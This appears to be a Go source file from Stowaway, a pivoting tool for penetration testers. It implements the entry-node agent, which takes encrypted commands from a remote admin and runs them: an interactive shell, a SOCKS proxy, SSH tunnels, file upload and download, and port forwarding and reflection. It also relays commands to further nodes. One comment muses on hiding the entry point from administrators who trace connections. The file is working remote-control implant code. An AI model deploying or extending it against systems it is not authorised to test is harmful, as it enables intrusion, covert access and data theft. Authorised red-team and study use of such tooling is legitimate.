package agent

import (
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"Stowaway/node"
	"Stowaway/share"
	"Stowaway/utils"
)

//startnode启动代码
//todo:可以为startnode加入一个保护机制，在startnode启动时可以设置是否开启此机制
//即当有节点异常断线时，可设置是否让startnode暂时断开与第二级节点的连接
//防止异常断线是由于管理员发现节点引起的，并根据connection进行逐点反查从而顺藤摸瓜找到入口点startnode,使得渗透测试者失去内网的入口点
//先暂时不加入，权当一个胡思乱想的idea，今后可视情况增加对startnode保护机制的处理代码，使得入口点更加稳固和隐蔽

// HandleStartNodeConn 处理与startnode的连接
func HandleStartNodeConn(connToAdmin *net.Conn, monitor, listenPort, reConn string, passive bool, nodeid string) {
	payloadBuffChan := make(chan *utils.Payload, 10)
	go HandleStartConn(connToAdmin, payloadBuffChan, monitor, listenPort, reConn, passive, nodeid)
	go HandleDataFromAdmin(connToAdmin, payloadBuffChan, monitor, listenPort, reConn, passive, nodeid)
	go HandleDataToAdmin(connToAdmin)
}

// HandleStartConn 处理与admin的信道
func HandleStartConn(connToAdmin *net.Conn, payloadBuffChan chan *utils.Payload, monitor, listenPort, reConn string, passive bool, nodeid string) {
	for {
		AdminData, err := utils.ExtractPayload(*connToAdmin, AgentStatus.AESKey, nodeid, false)
		if err != nil {
			AdminOffline(reConn, monitor, listenPort, passive)
			go SendInfo(nodeid) //重连后发送自身信息
			go SendNote(nodeid) //重连后发送admin设置的备忘
			continue
		}
		payloadBuffChan <- AdminData
	}
}

// HandleDataToAdmin 管理startnode发往admin的数据
func HandleDataToAdmin(connToAdmin *net.Conn) {
	for {
		proxyData := <-AgentStuff.ProxyChan.ProxyChanToUpperNode
		_, err := (*connToAdmin).Write(proxyData)
		if err != nil {
			continue
		}
	}
}

// HandleDataFromAdmin 管理admin端下发的数据
func HandleDataFromAdmin(connToAdmin *net.Conn, payloadBuffChan chan *utils.Payload, monitor, listenPort, reConn string, passive bool, nodeid string) {
	var (
		err          error
		cannotRead   = make(chan bool, 1)
		getName      = make(chan bool, 1)
		fileDataChan = make(chan []byte, 1)
		stdin        io.Writer
		stdout       io.Reader
	)
	for {
		AdminData := <-payloadBuffChan
		if AdminData.NodeId == nodeid {
			switch AdminData.Type {
			case "COMMAND":
				switch AdminData.Command {
				case "SHELL":
					switch AdminData.Info {
					case "":
						stdout, stdin, err = CreatInteractiveShell()
						if err != nil {
							message, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "SHELLFAIL", " ", "", 0, nodeid, AgentStatus.AESKey, false)
							AgentStuff.ProxyChan.ProxyChanToUpperNode <- message
							break
						}
						message, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "SHELLSUCCESS", " ", "", 0, nodeid, AgentStatus.AESKey, false)
						AgentStuff.ProxyChan.ProxyChanToUpperNode <- message
						go StartShell("", stdin, stdout, nodeid)
					default:
						stdin.Write([]byte(AdminData.Info))
					}
				case "SOCKS":
					socksInfo := strings.Split(AdminData.Info, ":::")
					AgentStuff.SocksInfo.SocksUsername = socksInfo[1]
					AgentStuff.SocksInfo.SocksPass = socksInfo[2]
					socksStartMess, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "SOCKSRESP", " ", "SUCCESS", 0, AgentStatus.Nodeid, AgentStatus.AESKey, false)
					AgentStuff.ProxyChan.ProxyChanToUpperNode <- socksStartMess
				case "UDPSTARTED":
					AgentStuff.Socks5UDPAssociate.Lock()
					AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].Ready <- AdminData.Info
					AgentStuff.Socks5UDPAssociate.Unlock()
				case "SSH":
					go func() {
						err := StartSSH(AdminData.Info, nodeid)
						if err == nil {
							go ReadCommand()
						}
					}()
				case "SSHCOMMAND":
					WriteCommand(AdminData.Info)
				case "SSHTUNNEL":
					go func() {
						err := SSHTunnelNextNode(AdminData.Info, nodeid)
						if err != nil {
							fmt.Println("[*]", err)
						}
					}()
				case "CONNECT":
					go func() {
						var status bool = false
						command := strings.Split(AdminData.Info, ":::")
						addr := command[0]
						choice := command[1]
						if choice == "1" { //连接的节点是否是在reuseport？
							status = node.ConnectNextNodeReuse(addr, nodeid, AgentStatus.AESKey)
						} else {
							status = node.ConnectNextNode(addr, nodeid, AgentStatus.AESKey)
						}
						if !status {
							message, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "NODECONNECTFAIL", " ", "", 0, nodeid, AgentStatus.AESKey, false)
							AgentStuff.ProxyChan.ProxyChanToUpperNode <- message
						}
					}()
				case "FILENAME":
					uploadFile, err := os.Create(AdminData.Info)
					if err != nil {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "CREATEFAIL", " ", " ", 0, nodeid, AgentStatus.AESKey, false)
						AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
					} else {
						respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "NAMECONFIRM", " ", " ", 0, nodeid, AgentStatus.AESKey, false)
						AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
						go share.ReceiveFile("", connToAdmin, fileDataChan, cannotRead, uploadFile, AgentStatus.AESKey, false, nodeid)
					}
				case "FILESIZE":
					share.File.FileSize, _ = strconv.ParseInt(AdminData.Info, 10, 64)
					respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "FILESIZECONFIRM", " ", " ", 0, nodeid, AgentStatus.AESKey, false)
					AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
					share.File.ReceiveFileSize <- true
				case "FILESLICENUM":
					share.File.TotalSilceNum, _ = strconv.Atoi(AdminData.Info)
					respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "FILESLICENUMCONFIRM", " ", " ", 0, nodeid, AgentStatus.AESKey, false)
					AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
					share.File.ReceiveFileSliceNum <- true
				case "FILESLICENUMCONFIRM":
					share.File.TotalConfirm <- true
				case "FILESIZECONFIRM":
					share.File.TotalConfirm <- true
				case "DOWNLOADFILE":
					go share.UploadFile("", AdminData.Info, connToAdmin, utils.AdminId, getName, AgentStatus.AESKey, nodeid, false)
				case "NAMECONFIRM":
					getName <- true
				case "CREATEFAIL":
					getName <- false
				case "CANNOTREAD":
					cannotRead <- true
					share.File.ReceiveFileSliceNum <- false
					os.Remove(AdminData.Info) //删除空文件
				case "FORWARDTEST":
					go TestForward(AdminData.Info)
				case "FORWARD":
					TryForward(AdminData.Info, AdminData.Clientid)
				case "FORWARDFIN":
					AgentStuff.ForwardConnMap.Lock()
					if _, ok := AgentStuff.ForwardConnMap.Payload[AdminData.Clientid]; ok {
						AgentStuff.ForwardConnMap.Payload[AdminData.Clientid].Close()
						delete(AgentStuff.ForwardConnMap.Payload, AdminData.Clientid)
					}
					AgentStuff.ForwardConnMap.Unlock()
					AgentStuff.PortFowardMap.Lock()
					if _, ok := AgentStuff.PortFowardMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(AgentStuff.PortFowardMap.Payload[AdminData.Clientid]) {
							if !utils.IsClosed(AgentStuff.PortFowardMap.Payload[AdminData.Clientid]) {
								close(AgentStuff.PortFowardMap.Payload[AdminData.Clientid])
							}
							delete(AgentStuff.PortFowardMap.Payload, AdminData.Clientid)
						}
					}
					AgentStuff.PortFowardMap.Unlock()
				case "REFLECTTEST":
					go TestReflect(AdminData.Info)
				case "REFLECTTIMEOUT":
					fallthrough
				case "REFLECTOFFLINE":
					AgentStuff.ReflectConnMap.Lock()
					if _, ok := AgentStuff.ReflectConnMap.Payload[AdminData.Clientid]; ok {
						AgentStuff.ReflectConnMap.Payload[AdminData.Clientid].Close()
						delete(AgentStuff.ReflectConnMap.Payload, AdminData.Clientid)
					}
					AgentStuff.ReflectConnMap.Unlock()
				case "REFLECTNUM":
					AgentStuff.ReflectStatus.ReflectNum <- AdminData.Clientid
				case "STOPREFLECT":
					AgentStuff.ReflectConnMap.Lock()
					for key, conn := range AgentStuff.ReflectConnMap.Payload {
						conn.Close()
						delete(AgentStuff.ForwardConnMap.Payload, key)
					}
					AgentStuff.ReflectConnMap.Unlock()

					for _, listener := range CurrentPortReflectListener {
						listener.Close()
					}
				case "LISTEN":
					go func() {
						err := TestListen(AdminData.Info)
						if err != nil {
							respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "LISTENRESP", " ", "FAILED", 0, nodeid, AgentStatus.AESKey, false)
							AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
						} else {
							respComm, _ := utils.ConstructPayload(utils.AdminId, "", "COMMAND", "LISTENRESP", " ", "SUCCESS", 0, nodeid, AgentStatus.AESKey, false)
							AgentStuff.ProxyChan.ProxyChanToUpperNode <- respComm
							go node.StartNodeListen(AdminData.Info, nodeid, AgentStatus.AESKey)
						}
					}()
				case "YOURINFO": //接收note
					AgentStatus.NodeNote = AdminData.Info
				case "FINOK":
					AgentStuff.SocksDataChanMap.Lock() //性能损失？
					if _, ok := AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid]) {
							close(AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid])
						}
						delete(AgentStuff.SocksDataChanMap.Payload, AdminData.Clientid)
					}
					AgentStuff.SocksDataChanMap.Unlock()
				case "FIN":
					AgentStuff.CurrentSocks5Conn.Lock()
					if _, ok := AgentStuff.CurrentSocks5Conn.Payload[AdminData.Clientid]; ok {
						AgentStuff.CurrentSocks5Conn.Payload[AdminData.Clientid].Close()
						delete(AgentStuff.CurrentSocks5Conn.Payload, AdminData.Clientid)
					}
					AgentStuff.CurrentSocks5Conn.Unlock()
					AgentStuff.SocksDataChanMap.Lock()
					if _, ok := AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						if !utils.IsClosed(AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid]) {
							close(AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid])
						}
						delete(AgentStuff.SocksDataChanMap.Payload, AdminData.Clientid)
					}
					AgentStuff.SocksDataChanMap.Unlock()
				case "UDPFIN":
					fallthrough
				case "UDPFINOK":
					AgentStuff.Socks5UDPAssociate.Lock()
					if _, ok := AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid]; ok {
						AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].Listener.Close()
						if !utils.IsClosed(AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].Ready) {
							close(AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].Ready)
						}
						if !utils.IsClosed(AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].UDPData) {
							close(AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].UDPData)
						}
						delete(AgentStuff.Socks5UDPAssociate.Info, AdminData.Clientid)
					}
					AgentStuff.Socks5UDPAssociate.Unlock()
				case "KEEPALIVE":
				default:
					continue
				}
			case "DATA":
				switch AdminData.Command {
				case "TCPSOCKSDATA":
					AgentStuff.SocksDataChanMap.Lock()
					if _, ok := AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid]; ok {
						AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid] <- AdminData.Info
					} else {
						AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid] = make(chan string, 1)
						go HanleClientSocksConn(AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid], AgentStuff.SocksInfo.SocksUsername, AgentStuff.SocksInfo.SocksPass, AdminData.Clientid, nodeid)
						AgentStuff.SocksDataChanMap.Payload[AdminData.Clientid] <- AdminData.Info
					}
					AgentStuff.SocksDataChanMap.Unlock()
				case "UDPSOCKSDATA":
					AgentStuff.Socks5UDPAssociate.Lock()
					if _, ok := AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid]; ok {
						AgentStuff.Socks5UDPAssociate.Info[AdminData.Clientid].UDPData <- AdminData.Info
					}
					AgentStuff.Socks5UDPAssociate.Unlock()
				case "FILEDATA": //接收文件内容
					fileDataChan <- []byte(AdminData.Info)
				case "FORWARDDATA":
					AgentStuff.ForwardConnMap.RLock()
					if _, ok := AgentStuff.ForwardConnMap.Payload[AdminData.Clientid]; ok {
						AgentStuff.PortFowardMap.Lock()
						if _, ok := AgentStuff.PortFowardMap.Payload[AdminData.Clientid]; ok {
							AgentStuff.PortFowardMap.Payload[AdminData.Clientid] <- AdminData.Info
						} else {
							AgentStuff.PortFowardMap.Payload[AdminData.Clientid] = make(chan string, 1)
							go HandleForward(AgentStuff.PortFowardMap.Payload[AdminData.Clientid], AdminData.Clientid)
							AgentStuff.PortFowardMap.Payload[AdminData.Clientid] <- AdminData.Info
						}
						AgentStuff.PortFowardMap.Unlock()
					}
					AgentStuff.ForwardConnMap.RUnlock()
				case "REFLECTDATARESP":
					AgentStuff.ReflectConnMap.Lock()
					AgentStuff.ReflectConnMap.Payload[AdminData.Clientid].Write([]byte(AdminData.Info))
					AgentStuff.ReflectConnMap.Unlock()
				default:
					continue
				}
			}
		} else {
			// 检查是否是admin发来的，分配给自己子节点的ID命令，是的话将admin分配的序号记录
			if AdminData.Route == "" && AdminData.Command == "ID" {
				AgentStatus.WaitForIDAllocate <- AdminData.NodeId //将此节点序号递交，以便启动HandleConnFromLowerNode函数
				node.NodeInfo.LowerNode.Lock()
				node.NodeInfo.LowerNode.Payload[AdminData.NodeId] = node.NodeInfo.LowerNode.Payload[utils.AdminId]
				node.NodeInfo.LowerNode.Unlock()
			}

			routeid := ChangeRoute(AdminData) //更改路由并返回下一个路由点
			proxyData, _ := utils.ConstructPayload(AdminData.NodeId, AdminData.Route, AdminData.Type, AdminData.Command, AdminData.FileSliceNum, AdminData.Info, AdminData.Clientid, AdminData.CurrentId, AgentStatus.AESKey, true)
			passToLowerData := utils.NewPassToLowerNodeData()

			if routeid == "" { //当返回的路由点为""，说明就是自己的子节点
				passToLowerData.Route = AdminData.NodeId
			} else { //不是""，说明不是自己的子节点，还需要一定轮数的递送
				passToLowerData.Route = routeid
			}

			passToLowerData.Data = proxyData //封装结构体，交给HandleConnToLowerNode处理
			AgentStuff.ProxyChan.ProxyChanToLowerNode <- passToLowerData
		}
	}
}
